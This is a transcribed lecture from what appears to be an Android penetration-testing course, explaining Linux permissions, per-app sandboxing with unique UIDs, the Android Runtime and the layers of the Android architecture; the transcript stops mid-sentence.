
# Section 3:Android-Intro-and-Security-Architecture

WEBVTT

1
00:00:00.540 --> 00:00:02.920
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay let's talk now about the Android security

2
00:00:02.920 --> 00:00:06.320
architecture and how we actually have applications run

3
00:00:06.320 --> 00:00:08.060
on Android phones securely.

4
00:00:09.380 --> 00:00:11.640
So one thing to keep in mind about

5
00:00:11.640 --> 00:00:14.420
Android is that everything is based on the

6
00:00:14.420 --> 00:00:15.840
Linux operating system.

7
00:00:16.440 --> 00:00:18.080
So this means that if we have a

8
00:00:18.080 --> 00:00:21.340
command line interface into our Android phone, it

9
00:00:21.340 --> 00:00:24.000
can actually take commands just like any Linux

10
00:00:24.000 --> 00:00:24.380
device.

11
00:00:24.780 --> 00:00:27.080
So you have your basic commands like ls

12
00:00:27.080 --> 00:00:29.600
for listing the file system, cd to change

13
00:00:29.600 --> 00:00:32.560
directories, rm to remove files, etc.

14
00:00:33.020 --> 00:00:36.040
If you're not familiar with the Linux basics,

15
00:00:36.220 --> 00:00:37.760
I would definitely recommend that you get a

16
00:00:37.760 --> 00:00:40.700
tryhackme account and do their Linux basics room

17
00:00:40.700 --> 00:00:42.360
because that will definitely get you up to

18
00:00:42.360 --> 00:00:44.520
speed on how you can do some basic

19
00:00:44.520 --> 00:00:45.360
Linux commands.

20
00:00:45.880 --> 00:00:47.840
We will be using that throughout the course

21
00:00:47.840 --> 00:00:49.880
because we can actually get a shell into

22
00:00:49.880 --> 00:00:52.180
our Android phone, we'll be able to do

23
00:00:52.180 --> 00:00:54.040
commands on our Android phone.

24
00:00:54.300 --> 00:00:56.460
So definitely if you don't know anything about

25
00:00:56.460 --> 00:00:59.060
Linux, I recommend going out there and learning

26
00:00:59.060 --> 00:01:01.420
something before you go further in this course.

27
00:01:02.300 --> 00:01:04.740
So something to keep in mind about Android

28
00:01:04.740 --> 00:01:07.620
being based on the Linux operating system is

29
00:01:07.620 --> 00:01:10.980
that the permissions to folders and applications are

30
00:01:10.980 --> 00:01:13.020
going to be dependent on the Linux operating

31
00:01:13.020 --> 00:01:14.940
system file permissions model.

32
00:01:15.400 --> 00:01:17.320
Maybe you are familiar with this where you

33
00:01:17.320 --> 00:01:21.040
have 10 different digits that determine information for

34
00:01:21.040 --> 00:01:23.980
permissions about files in a Linux operating system.

35
00:01:24.420 --> 00:01:26.500
The first digit, as you can see in

36
00:01:26.500 --> 00:01:29.780
the picture here, is the file type and

37
00:01:29.780 --> 00:01:31.420
that is going to be a file like

38
00:01:31.420 --> 00:01:34.960
a directory or an executable file indicated by

39
00:01:34.960 --> 00:01:37.200
a D for directory or X for an

40
00:01:37.200 --> 00:01:38.160
executable file.

41
00:01:38.580 --> 00:01:41.000
The next thing is that we're going to

42
00:01:41.000 --> 00:01:43.600
be defining the permissions of the owner of

43
00:01:43.600 --> 00:01:44.240
that file.

44
00:01:44.460 --> 00:01:46.280
As you can see in this picture where

45
00:01:46.280 --> 00:01:49.320
we're listing the file, the owner has a

46
00:01:49.320 --> 00:01:52.160
read and write permission which is indicated by

47
00:01:52.160 --> 00:01:52.800
RW.

48
00:01:53.920 --> 00:01:56.820
The next group of permissions is for the

49
00:01:56.820 --> 00:01:58.520
actual group and you can see here that

50
00:01:58.520 --> 00:02:01.380
this one is just R for read and

51
00:02:01.380 --> 00:02:04.600
then the final set of three is for

52
00:02:04.600 --> 00:02:08.479
the other users permissions and here it is

53
00:02:08.479 --> 00:02:09.740
also read.

54
00:02:11.340 --> 00:02:13.940
So the thing that's important about this is

55
00:02:13.940 --> 00:02:16.700
that our applications are actually going to be

56
00:02:16.700 --> 00:02:19.640
isolated from each other by using this file

57
00:02:19.640 --> 00:02:20.540
permission model.

58
00:02:20.960 --> 00:02:21.880
So you're going to want to keep this

59
00:02:21.880 --> 00:02:23.520
in mind when we talk a little bit

60
00:02:23.520 --> 00:02:26.480
more about how this actually affects the real

61
00:02:26.480 --> 00:02:28.200
applications on the Android phone.

62
00:02:28.880 --> 00:02:34.000
Now every application on the Android emulator or

63
00:02:34.000 --> 00:02:36.560
an Android phone is actually run in a

64
00:02:36.560 --> 00:02:39.660
virtual machine known as the Android Runtime.

65
00:02:40.320 --> 00:02:42.580
Now you may hear this term called a

66
00:02:42.580 --> 00:02:45.460
Dalvik virtual machine and this was actually the

67
00:02:45.460 --> 00:02:48.800
very first runtime virtual machine for the Android

68
00:02:48.800 --> 00:02:49.840
operating system.

69
00:02:50.260 --> 00:02:52.520
In some cases this is actually still referred

70
00:02:52.520 --> 00:02:55.160
to as Dalvik bytecode and we talk about

71
00:02:55.160 --> 00:02:58.800
how an application is decompiled into its source

72
00:02:58.800 --> 00:03:01.060
code and into machine code.

73
00:03:01.380 --> 00:03:03.720
But the Dalvik virtual machine is no longer

74
00:03:03.720 --> 00:03:07.120
utilized in the modern Android operating system, it

75
00:03:07.120 --> 00:03:09.000
has been replaced by this thing called the

76
00:03:09.000 --> 00:03:10.120
Android Runtime.

77
00:03:10.460 --> 00:03:13.280
Now the Android Runtime is basically a modern

78
00:03:13.280 --> 00:03:16.960
translation layer from the application's bytecode to the

79
00:03:16.960 --> 00:03:18.080
device instructions.

80
00:03:18.240 --> 00:03:20.040
So you think about it that way, every

81
00:03:20.040 --> 00:03:22.400
application has something that it's doing to the

82
00:03:22.400 --> 00:03:25.280
device right, maybe it's accessing the camera, maybe

83
00:03:25.280 --> 00:03:27.040
it's interacting with the device in a certain

84
00:03:27.040 --> 00:03:29.040
way waiting for an input from the user.

85
00:03:29.320 --> 00:03:33.140
The Android Runtime is how that information is

86
00:03:33.140 --> 00:03:35.780
translated to actual actions on a device.

87
00:03:36.340 --> 00:03:39.220
Every single application in the Android phone runs

88
00:03:39.220 --> 00:03:42.900
in its own sandbox virtual machine and so

89
00:03:42.900 --> 00:03:46.100
every application is actually assigned its own folder

90
00:03:46.100 --> 00:03:48.600
with its own owner, which we'll get to

91
00:03:48.600 --> 00:03:51.380
in the next slide, which allows the applications

92
00:03:51.380 --> 00:03:53.620
to be sandboxed from each other so they're

93
00:03:53.620 --> 00:03:56.940
not allowed to by default interact with each

94
00:03:56.940 --> 00:03:57.240
other.

95
00:03:57.700 --> 00:04:00.060
So in the file system applications are isolated

96
00:04:00.060 --> 00:04:02.760
by creating a brand new user account unique

97
00:04:02.760 --> 00:04:04.600
for that individual application.

98
00:04:05.440 --> 00:04:06.580
And this is kind of what it looks

99
00:04:06.580 --> 00:04:09.280
like from identity and access management perspective.

100
00:04:09.620 --> 00:04:12.480
So each application has its own user for

101
00:04:12.480 --> 00:04:15.920
that application and the user is the owner

102
00:04:15.920 --> 00:04:19.899
of the application directory and that user that

103
00:04:19.899 --> 00:04:22.540
is created for the application that's also the

104
00:04:22.540 --> 00:04:25.840
owner of the application's directory is assigned a

105
00:04:25.840 --> 00:04:32.000
UID between 10,000 and 999,999 which

106
00:04:32.000 --> 00:04:35.260
translates to a username usually something pretty similar

107
00:04:35.260 --> 00:04:39.720
to like U0 underscore A188 for a UID

108
00:04:39.720 --> 00:04:43.420
corresponding to 10188 if that makes sense.

109
00:04:44.240 --> 00:04:46.740
Now here in the slide I have four

110
00:04:46.740 --> 00:04:48.720
different directories and what I'm trying to show

111
00:04:48.720 --> 00:04:52.700
here is that these two different applications one

112
00:04:52.700 --> 00:04:56.400
named example.app and another named example2.app

113
00:04:56.400 --> 00:04:58.800
would have completely separate directories.

114
00:04:58.980 --> 00:05:00.900
So the top bullet point here we have

115
00:05:00.900 --> 00:05:03.240
our slash data slash app slash com dot

116
00:05:03.240 --> 00:05:04.260
example dot app.

117
00:05:04.440 --> 00:05:07.020
This is where our generic application data will

118
00:05:07.020 --> 00:05:10.020
be stored for an application called say example

119
00:05:10.020 --> 00:05:10.540
app.

120
00:05:10.860 --> 00:05:13.420
Now the fourth bullet point there we have

121
00:05:13.420 --> 00:05:16.460
the data data com example 2.app. This

122
00:05:16.460 --> 00:05:19.340
is a totally separate directory owned by a

123
00:05:19.340 --> 00:05:23.920
different user with a different UID that would

124
00:05:23.920 --> 00:05:25.740
be installed on the same phone.

125
00:05:25.880 --> 00:05:28.780
So this is how these two example applications

126
00:05:28.780 --> 00:05:31.600
example.app 1 and example.app 2 would

127
00:05:31.600 --> 00:05:34.200
be installed as their own separate directories.

128
00:05:34.760 --> 00:05:37.860
Now with that said any given application will

129
00:05:37.860 --> 00:05:40.540
also have some additional directories like I'm showing

130
00:05:40.540 --> 00:05:42.240
in the top three bullet points these are

131
00:05:42.240 --> 00:05:45.060
all the directories that would apply to the

132
00:05:45.060 --> 00:05:49.060
application named com.example.app. So for example

133
00:05:49.060 --> 00:05:51.980
the slash data slash data com.example.app

134
00:05:51.980 --> 00:05:54.180
this is where the runtime storage of the

135
00:05:54.180 --> 00:05:55.360
application will be stored.

136
00:05:55.800 --> 00:05:58.400
Also if we're externally storing any information we

137
00:05:58.400 --> 00:06:00.480
could find that kind of data in mount

138
00:06:00.480 --> 00:06:04.100
SD card Android data com.example.app as

139
00:06:04.100 --> 00:06:04.700
an example.

140
00:06:04.960 --> 00:06:07.660
So that's where we'd store externally located data

141
00:06:07.660 --> 00:06:08.360
as well.

142
00:06:09.080 --> 00:06:13.680
Now those directories would also correspond with example

143
00:06:13.680 --> 00:06:16.840
2.app accordingly but they would be owned

144
00:06:16.840 --> 00:06:20.480
by the same application user who corresponds to

145
00:06:20.480 --> 00:06:24.560
the example 2.app. So because every single

146
00:06:24.560 --> 00:06:27.400
application is assigned its own directory with its

147
00:06:27.400 --> 00:06:30.700
own user account that's the owner of that

148
00:06:30.700 --> 00:06:34.220
directory it stops applications from interacting with each

149
00:06:34.220 --> 00:06:36.860
other unless explicitly granted permissions.

150
00:06:37.380 --> 00:06:40.340
And how a developer usually will grant permissions

151
00:06:40.340 --> 00:06:42.880
to an application to share some data is

152
00:06:42.880 --> 00:06:45.840
either through a content provider or a broadcast

153
00:06:45.840 --> 00:06:46.500
receiver.

154
00:06:46.760 --> 00:06:48.780
As I'm showing in the bottom right hand

155
00:06:48.780 --> 00:06:51.200
corner we have the open with Chrome or

156
00:06:51.200 --> 00:06:52.880
Firefox pop-up here.

157
00:06:53.100 --> 00:06:55.000
This is when we would be using a

158
00:06:55.000 --> 00:06:57.620
broadcast receiver to receive some data to the

159
00:06:57.620 --> 00:06:59.980
Chrome and Firefox web browsers.

160
00:07:00.140 --> 00:07:01.740
Maybe it's like a URL or a website

161
00:07:01.740 --> 00:07:02.800
you're navigating to.

162
00:07:03.280 --> 00:07:06.400
Those applications would be exposing a broadcast receiver

163
00:07:06.400 --> 00:07:09.500
and waiting for that application data to come

164
00:07:09.500 --> 00:07:11.200
across to them so they can open up

165
00:07:11.200 --> 00:07:12.560
and do whatever they need to do.

166
00:07:13.020 --> 00:07:15.380
Now a content provider is similar to a

167
00:07:15.380 --> 00:07:18.000
broadcast receiver but instead of waiting for a

168
00:07:18.000 --> 00:07:21.060
response our application is actually serving some type

169
00:07:21.060 --> 00:07:23.540
of data out to other applications if that

170
00:07:23.540 --> 00:07:25.440
content provider is exported.

171
00:07:26.280 --> 00:07:28.960
Now something else to keep in mind about

172
00:07:28.960 --> 00:07:33.040
these Android phones and Android identity access management

173
00:07:33.040 --> 00:07:35.620
in general is that the root user and

174
00:07:35.620 --> 00:07:38.140
system level accounts are really the only way

175
00:07:38.140 --> 00:07:39.380
that we're going to be able to get

176
00:07:39.380 --> 00:07:41.640
access to all of these different type of

177
00:07:41.640 --> 00:07:42.160
directories.

178
00:07:42.420 --> 00:07:45.340
Like I said every single application has its

179
00:07:45.340 --> 00:07:48.240
own directory owned by its own special user.

180
00:07:48.660 --> 00:07:52.060
So we need a sweeping access to be

181
00:07:52.060 --> 00:07:54.320
able to access all of those directories because

182
00:07:54.320 --> 00:07:55.620
each one has a different owner.

183
00:07:56.080 --> 00:07:59.420
So that's why sometimes having a rooted device

184
00:07:59.420 --> 00:08:02.020
such as we'll be showing in this course

185
00:08:02.020 --> 00:08:05.720
with emulators will allow us to gain access

186
00:08:05.720 --> 00:08:08.700
to different application directories and have access to

187
00:08:08.700 --> 00:08:11.000
every application directory on the device.

188
00:08:12.180 --> 00:08:15.680
Now an important caveat there is that emulators

189
00:08:15.680 --> 00:08:18.620
with non Google Play APIs will allow root.

190
00:08:19.000 --> 00:08:21.200
Well we'll understand this when we get to

191
00:08:21.200 --> 00:08:24.200
the actual emulator setup video where I'll explain

192
00:08:24.200 --> 00:08:26.280
the different types of emulators you should have

193
00:08:26.280 --> 00:08:28.240
so that you have some emulators with root

194
00:08:28.240 --> 00:08:30.500
access so you'll be able to go in

195
00:08:30.500 --> 00:08:33.100
and actually look at all the application directories.

196
00:08:34.280 --> 00:08:36.780
Now some other just interesting things about Android

197
00:08:36.780 --> 00:08:39.700
identity access management that is kind of upcoming

198
00:08:39.700 --> 00:08:44.580
things is instances such as profiles and this

199
00:08:44.580 --> 00:08:47.420
can allow you to separate not only application

200
00:08:47.420 --> 00:08:50.300
data but it can also allow you to

201
00:08:50.300 --> 00:08:54.720
separate functions such as the clipboard or contacts

202
00:08:54.720 --> 00:08:57.200
and cameras into their own separate profiles.

203
00:08:57.820 --> 00:09:01.000
So a profile is usually used in use

204
00:09:01.000 --> 00:09:02.600
cases when we need something like a bring

205
00:09:02.600 --> 00:09:03.440
your own device.

206
00:09:03.840 --> 00:09:05.900
Maybe you have something like a phone with

207
00:09:05.900 --> 00:09:07.780
a work profile on it and a personal

208
00:09:07.780 --> 00:09:10.140
profile and you want to isolate those two

209
00:09:10.140 --> 00:09:11.300
things from each other.

210
00:09:11.980 --> 00:09:15.340
So the cool thing about profiles is they

211
00:09:15.340 --> 00:09:18.220
still have access to system level functions such

212
00:09:18.220 --> 00:09:21.660
as Wi-Fi, Bluetooth, 4G, LTE obviously right

213
00:09:21.660 --> 00:09:24.920
but they can also have some isolated aspects.

214
00:09:25.800 --> 00:09:28.420
So for example if you have Microsoft Teams

215
00:09:28.420 --> 00:09:30.300
installed on your phone on your work profile

216
00:09:30.300 --> 00:09:33.120
maybe you do not want to allow exfiltration

217
00:09:33.120 --> 00:09:35.240
of data out of there by the clipboard

218
00:09:35.240 --> 00:09:37.260
so you can have totally separate clipboards for

219
00:09:37.260 --> 00:09:39.000
the two different types of profiles.

220
00:09:39.540 --> 00:09:41.740
Some other interesting things to keep in mind

221
00:09:41.740 --> 00:09:45.700
about the Android identity access management practices there's

222
00:09:45.700 --> 00:09:48.060
this cool thing called the primary user and

223
00:09:48.060 --> 00:09:50.420
this is actually a user that is first

224
00:09:50.420 --> 00:09:53.060
created when the phone is started and this

225
00:09:53.060 --> 00:09:55.280
user is actually always running in the background

226
00:09:55.280 --> 00:09:57.320
and it can only be removed by factory

227
00:09:57.320 --> 00:09:57.840
reset.

228
00:09:58.100 --> 00:10:00.760
Not necessarily something we'll be taking advantage of

229
00:10:00.760 --> 00:10:02.580
in this course but it is something interesting

230
00:10:02.580 --> 00:10:05.360
to know about how user accounts are assigned

231
00:10:05.360 --> 00:10:07.500
when the phone is first booted up.

232
00:10:07.920 --> 00:10:10.240
You can also have secondary users who are

233
00:10:10.240 --> 00:10:12.400
additional users you can add to the device

234
00:10:12.400 --> 00:10:15.200
and those users can only be created and

235
00:10:15.200 --> 00:10:18.060
deleted by the primary user and likewise you

236
00:10:18.060 --> 00:10:19.940
can also have guest users so you can

237
00:10:19.940 --> 00:10:22.020
have a guest user on your device a

238
00:10:22.020 --> 00:10:24.200
fast way to give someone access to your

239
00:10:24.200 --> 00:10:26.220
phone and maybe limit what they have access

240
00:10:26.220 --> 00:10:26.500
to.

241
00:10:27.060 --> 00:10:30.200
Obviously when we're talking about device security something

242
00:10:30.200 --> 00:10:32.260
important for a lot of parents out there

243
00:10:32.260 --> 00:10:34.860
is things like kid mode right to isolate

244
00:10:34.860 --> 00:10:36.760
what kids are allowed to get access to.

245
00:10:37.080 --> 00:10:39.580
Things like Google Kids Spaces which is currently

246
00:10:39.580 --> 00:10:41.480
only on tablets only but I'm sure it

247
00:10:41.480 --> 00:10:43.720
will be supporting additional Android devices.

248
00:10:44.200 --> 00:10:46.200
You can also set up things for profiles

249
00:10:46.200 --> 00:10:48.700
for kids and also you can use vendor

250
00:10:48.700 --> 00:10:52.080
specific kid modes such as Samsung Kid Mode

251
00:10:52.080 --> 00:10:54.500
or there's also some applications out there that

252
00:10:54.500 --> 00:10:57.100
will gain full access to the device to

253
00:10:57.100 --> 00:10:59.760
allow only certain websites for kids or to

254
00:10:59.760 --> 00:11:02.080
you know have a time limited amount of

255
00:11:02.080 --> 00:11:03.940
time that kids are allowed to use certain

256
00:11:03.940 --> 00:11:04.640
applications.

257
00:11:05.140 --> 00:11:08.120
Things like Net Nanny and like Norton Kid

258
00:11:08.120 --> 00:11:12.200
can be useful applications for parents out there

259
00:11:12.200 --> 00:11:14.200
if you're looking at things for kid mode.

260
00:11:15.480 --> 00:11:19.300
Now moving into the Android architecture and this

261
00:11:19.300 --> 00:11:20.520
is where we're going to get into the

262
00:11:20.520 --> 00:11:22.800
real depths of all the different aspects of

263
00:11:22.800 --> 00:11:23.260
Android.

264
00:11:23.540 --> 00:11:25.600
We're going to do this based on this

265
00:11:25.600 --> 00:11:27.840
diagram here that I took from the mobile

266
00:11:27.840 --> 00:11:28.920
pen testing getbook.

267
00:11:29.020 --> 00:11:30.620
We're going to start from the bottom with

268
00:11:30.620 --> 00:11:32.860
the Linux kernel move up to the hardware

269
00:11:32.860 --> 00:11:35.720
abstraction layer go into the libraries there which

270
00:11:35.720 --> 00:11:38.180
come in two different varieties native C or

271
00:11:38.180 --> 00:11:40.560
the Android runtime then we'll go to the

272
00:11:40.560 --> 00:11:43.600
Java API framework and finally finish up with

273
00:11:43.600 --> 00:11:44.520
the system apps.

274
00:11:45.440 --> 00:11:49.420
Okay so obviously Android is based on the

275
00:11:49.420 --> 00:11:52.340
Linux kernel and back in November of 2012

276
00:11:52.340 --> 00:11:55.200
that is the introduction of SE Linux which

277
00:11:55.200 --> 00:11:57.060
is security enhanced Linux.

278
00:11:57.320 --> 00:11:59.140
If you don't know anything about security enhanced

279
00:11:59.140 --> 00:12:01.400
Linux I definitely recommend going out there and

280
00:12:01.400 --> 00:12:03.580
reading up about that and that was not

281
00:12:03.580 --> 00:12:07.460
enabled by default until July 2013 with API

282
00:12:07.460 --> 00:12:10.080
level 18 so something to consider when we're

283
00:12:10.080 --> 00:12:13.020
looking back at previous versions of Android there.

284
00:12:13.260 --> 00:12:16.220
You can see that the Android runtime was

285
00:12:16.220 --> 00:12:19.040
now used by default in November of 2014

286
00:12:19.040 --> 00:12:21.760
and obviously they've been making tons of improvements

287
00:12:21.760 --> 00:12:23.460
to Android over time.

288
00:12:23.900 --> 00:12:26.460
Just some interesting versions of Android to know

289
00:12:26.460 --> 00:12:28.760
about and obviously you can tell from this

290
00:12:28.760 --> 00:12:32.040
picture that depending on which version of Android

291
00:12:32.040 --> 00:12:34.740
operating system that we're supporting with our application

292
00:12:34.740 --> 00:12:37.780
it can actually determine some of the security

293
00:12:37.780 --> 00:12:40.340
vulnerabilities that we might find and so a

294
00:12:40.340 --> 00:12:42.560
common attack path that we'll be using throughout

295
00:12:42.560 --> 00:12:45.480
this course is running our application for example

296
00:12:45.480 --> 00:12:48.520
on API level 29 and maybe on API

297
00:12:48.520 --> 00:12:51.000
level 22 as well to see the differences

298
00:12:51.000 --> 00:12:53.620
in terms of the security to see if

299
00:12:53.620 --> 00:12:56.740
the application is doing something different depending on

300
00:12:56.740 --> 00:12:58.020
the API version.

301
00:13:00.490 --> 00:13:02.730
Obviously something important to keep in mind when

302
00:13:02.730 --> 00:13:04.410
it comes to the Linux kernel is that

303
00:13:04.410 --> 00:13:07.950
Android devices have to support multiple CPU architectures

304
00:13:07.950 --> 00:13:10.730
such as ARM, system on chips, 32 and

305
00:13:10.730 --> 00:13:15.770
64-bit chips right and applications are explicitly

306
00:13:15.770 --> 00:13:19.170
told which version of the Android runtime version

307
00:13:19.170 --> 00:13:22.070
to run on so in our Android manifest

308
00:13:22.070 --> 00:13:25.210
XML when we get to static analysis we'll

309
00:13:25.210 --> 00:13:28.110
be talking about the min SDK version and

310
00:13:28.110 --> 00:13:31.490
that determines what versions of the Android API

311
00:13:31.490 --> 00:13:34.490
or Android operating system our application can run

312
00:13:34.490 --> 00:13:34.770
on.

313
00:13:35.110 --> 00:13:38.430
Obviously from a security perspective based on that

314
00:13:38.430 --> 00:13:41.150
Linux kernel picture I just showed the higher

315
00:13:41.150 --> 00:13:43.590
the API version the better from a security

316
00:13:43.590 --> 00:13:46.310
perspective because we're building on the experience of

317
00:13:46.310 --> 00:13:50.150
the Android operating system right but the handoff

318
00:13:50.150 --> 00:13:52.750
there is that developers always want to try

319
00:13:52.750 --> 00:13:55.830
to include the most customers possible so if

320
00:13:55.830 --> 00:13:58.430
we allowed an application to run on say

321
00:13:58.430 --> 00:14:02.410
Android runtime version 1 all the way up

322
00:14:02.410 --> 00:14:04.530
to the most recent version we'd be including

323
00:14:04.530 --> 00:14:07.370
100% of the marketplace right but the

324
00:14:07.370 --> 00:14:09.490
downside of that is that that can include

325
00:14:09.490 --> 00:14:13.650
some security vulnerabilities as well so lower versions

326
00:14:13.650 --> 00:14:16.290
of the Android operating system can have more

327
00:14:16.290 --> 00:14:19.090
security vulnerabilities and allow for different types of

328
00:14:19.090 --> 00:14:21.410
attacks so we have to be careful about

329
00:14:21.410 --> 00:14:24.150
what types of the operating system we're allowing

330
00:14:24.150 --> 00:14:26.470
our application to run on because we want

331
00:14:26.470 --> 00:14:28.310
to have it run on the most secure

332
00:14:28.310 --> 00:14:31.590
possible without obviously isolating a lot of our

333
00:14:31.590 --> 00:14:32.070
customers.

334
00:14:33.110 --> 00:14:35.630
Also the Linux kernel as a side note

335
00:14:35.630 --> 00:14:38.470
allows access to the physical components of the

336
00:14:38.470 --> 00:14:41.230
Linux device controlled by drivers just like any

337
00:14:41.230 --> 00:14:44.970
device right you're gonna have drivers for your

338
00:14:44.970 --> 00:14:49.330
different hardware components and this is kind of

339
00:14:49.330 --> 00:14:52.170
where the hardware abstraction layer comes in because

340
00:14:52.170 --> 00:14:55.950
the hardware abstraction layer allows applications to access

341
00:14:55.950 --> 00:15:00.210
hardware components irrespective of the device manufacturer or

342
00:15:00.210 --> 00:15:00.550
type.

343
00:15:00.970 --> 00:15:03.450
You can obviously imagine two different Android phones

344
00:15:03.450 --> 00:15:06.030
by two different manufacturers in the store side

345
00:15:06.030 --> 00:15:08.410
by side maybe they're the same price phone

346
00:15:08.410 --> 00:15:11.550
right but those phones all have different components

347
00:15:11.550 --> 00:15:14.070
inside of them maybe one has a camera

348
00:15:14.070 --> 00:15:16.230
made by one company one has a Bluetooth

349
00:15:16.230 --> 00:15:19.090
sensor made by a different company right but

350
00:15:19.090 --> 00:15:23.410
the hardware abstraction layer allows our applications respective

351
00:15:23.410 --> 00:15:27.890
irrespective of the device manufacturer irrespective of the

352
00:15:27.890 --> 00:15:30.910
components inside of it to access things in

353
00:15:30.910 --> 00:15:34.550
generic categories like the camera the microphone the

354
00:15:34.550 --> 00:15:37.450
location Bluetooth touch drivers etc.

355
00:15:38.230 --> 00:15:40.650
So our applications actually do not need to

356
00:15:40.650 --> 00:15:43.930
know any of the specific drivers for those

357
00:15:43.930 --> 00:15:46.630
hardware components or the manufacturer details.

358
00:15:47.110 --> 00:15:50.010
The hardware abstraction layer allows our application to

359
00:15:50.010 --> 00:15:54.270
access the microphone as the microphone right and

360
00:15:54.270 --> 00:15:57.210
doesn't care about who the manufacturer was it

361
00:15:57.210 --> 00:15:58.570
just knows that's the microphone.

362
00:15:59.270 --> 00:16:00.950
So things to keep in mind here that

363
00:16:00.950 --> 00:16:03.870
are interesting new and upcoming HAL types such

364
00:16:03.870 --> 00:16:06.330
as automotive right a lot of phones these

365
00:16:06.330 --> 00:16:08.930
days have support for things like Android Auto

366
00:16:08.930 --> 00:16:11.010
and Apple CarPlay that means that our phone

367
00:16:11.010 --> 00:16:13.890
is now interacting not only with itself or

368
00:16:13.890 --> 00:16:17.030
Bluetooth or 4G but we're also interacting with

369
00:16:17.030 --> 00:16:18.450
our automobiles right.

370
00:16:19.210 --> 00:16:22.170
We also have emerging categories such as IoT

371
00:16:22.170 --> 00:16:25.370
with things like fitness watches and fitness devices

372
00:16:25.370 --> 00:16:28.710
like Pelotons where our devices you know might

373
00:16:28.710 --> 00:16:31.330
be tracking our heart rate monitor off of

374
00:16:31.330 --> 00:16:31.910
the Peloton.

375
00:16:32.730 --> 00:16:35.630
Also some integrations with our IoT home devices

376
00:16:35.630 --> 00:16:38.450
so things like Alexa Google Home etc.

377
00:16:38.870 --> 00:16:41.690
Our phones are now interacting with those as

378
00:16:41.690 --> 00:16:44.690
well as a hardware component irrespective of the

379
00:16:44.690 --> 00:16:45.850
device manufacturer.

380
00:16:46.750 --> 00:16:48.430
Another thing to keep in mind that's gonna

381
00:16:48.430 --> 00:16:50.350
be upcoming is gonna be things like gaming

382
00:16:50.350 --> 00:16:54.850
peripherals maybe we're hooking controllers you can even

383
00:16:54.850 --> 00:16:56.910
in some cases you know hook your phone

384
00:16:56.910 --> 00:16:59.310
up with a USB-C port and have

385
00:16:59.310 --> 00:17:01.590
it display things just like a normal computer.

386
00:17:02.390 --> 00:17:06.510
So things like gaming peripherals and interactions you

387
00:17:06.510 --> 00:17:09.250
know when our phones become more like laptops

388
00:17:09.250 --> 00:17:10.970
is when we're gonna see these new HAL

389
00:17:10.970 --> 00:17:13.790
types emerging where phones and applications are gonna

390
00:17:13.790 --> 00:17:17.990
need to start supporting even more additional peripherals.

391
00:17:20.050 --> 00:17:23.130
Okay now we're gonna talk about the native

392
00:17:23.130 --> 00:17:25.250
C versus the Android runtime.

393
00:17:25.990 --> 00:17:27.910
So when it comes to our Android device

394
00:17:27.910 --> 00:17:30.890
C and C++ is the device's native language

395
00:17:30.890 --> 00:17:33.630
and anything that goes through C and C++

396
00:17:33.630 --> 00:17:36.750
does not require going through a virtual machine.

397
00:17:37.170 --> 00:17:39.090
Things like the WebKit which is a built

398
00:17:39.090 --> 00:17:42.570
-in web browser for applications sometimes when you

399
00:17:42.570 --> 00:17:44.810
pull up a website in an application it

400
00:17:44.810 --> 00:17:46.490
will kind of pop up this iframe looking

401
00:17:46.490 --> 00:17:49.010
thing that is what is considered the WebKit

402
00:17:49.010 --> 00:17:51.190
and that does not run through the Android

403
00:17:51.190 --> 00:17:52.050
virtual machine.

404
00:17:52.050 --> 00:17:55.250
And we also have things like OpenMAX AL,

405
00:17:55.430 --> 00:17:59.010
OpenGL ES which are UI frameworks for displaying

406
00:17:59.010 --> 00:18:01.610
2D and 3D models so in some cases

407
00:18:01.610 --> 00:18:04.650
some things like games or different applications can

408
00:18:04.650 --> 00:18:08.770
actually run UI frameworks through the device's native

409
00:18:08.770 --> 00:18:09.290
language.

410
00:18:09.930 --> 00:18:11.850
Now the thing is is that Java is

411
00:18:11.850 --> 00:18:14.350
often easier to code in for many developers

412
00:18:14.350 --> 00:18:17.590
so usually developers prefer this anything that is

413
00:18:17.590 --> 00:18:19.670
going through Java is going to go through

414
00:18:19.670 --> 00:18:21.790
the Android runtime environment.

415
00:18:22.450 --> 00:18:24.970
So older apps are usually built in strictly

416
00:18:24.970 --> 00:18:27.230
Java while newer ones are built in this

417
00:18:27.230 --> 00:18:28.290
thing called Kotlin.

418
00:18:28.750 --> 00:18:30.350
If you don't know anything about Kotlin definitely

419
00:18:30.350 --> 00:18:32.690
recommend looking into that as well and in

420
00:18:32.690 --> 00:18:35.790
2019 Google actually announced that Kotlin is going

421
00:18:35.790 --> 00:18:38.350
to be the preferred coding standard for Android

422
00:18:38.350 --> 00:18:41.530
applications in the future and Kotlin is currently

423
00:18:41.530 --> 00:18:44.670
utilized by about 60% of professionally developed

424
00:18:44.670 --> 00:18:46.730
applications out there on the Play Store.

425
00:18:47.210 --> 00:18:48.830
If you want to read more about Kotlin

426
00:18:48.830 --> 00:18:51.250
you can go to developer.android.com slash

427
00:18:51.250 --> 00:18:51.810
Kotlin.

428
00:18:52.330 --> 00:18:54.990
We'll pop this open real quick you can

429
00:18:54.990 --> 00:18:57.290
see you know it has some documentation here

430
00:18:57.290 --> 00:18:59.710
about how to write things in Kotlin how

431
00:18:59.710 --> 00:19:02.450
you can learn things from scratch definitely recommend

432
00:19:02.450 --> 00:19:04.390
going out there and learning that because if

433
00:19:04.390 --> 00:19:05.750
you want to learn how to develop an

434
00:19:05.750 --> 00:19:07.730
application as well it can be very helpful

435
00:19:07.730 --> 00:19:08.230
for you.

436
00:19:10.400 --> 00:19:13.320
Okay now moving into the Java API framework

437
00:19:13.320 --> 00:19:15.640
and this is really what allows your app

438
00:19:15.640 --> 00:19:18.680
to interact with other applications as well as

439
00:19:18.680 --> 00:19:19.840
the device itself.

440
00:19:20.360 --> 00:19:22.500
So in the Java API framework here you

441
00:19:22.500 --> 00:19:24.660
can see we have things like content providers

442
00:19:24.660 --> 00:19:27.020
which is a way of sharing data to

443
00:19:27.020 --> 00:19:30.200
other applications via a specific directory usually it's

444
00:19:30.200 --> 00:19:33.800
in this format content colon slash slash whatever

445
00:19:33.800 --> 00:19:38.120
the application URI is slash directory and this

446
00:19:38.120 --> 00:19:39.640
is something we'll be looking for in our

447
00:19:39.640 --> 00:19:43.320
static analysis process to see if our application

448
00:19:43.320 --> 00:19:45.020
is sharing any data out there.

449
00:19:45.580 --> 00:19:48.040
The view system in the Java API framework

450
00:19:48.040 --> 00:19:50.640
is used for making the app's UI and

451
00:19:50.640 --> 00:19:52.440
normalizing it across the phone.

452
00:19:52.860 --> 00:19:55.820
We also have things for managers that are

453
00:19:55.820 --> 00:19:57.720
going to be running things in the background

454
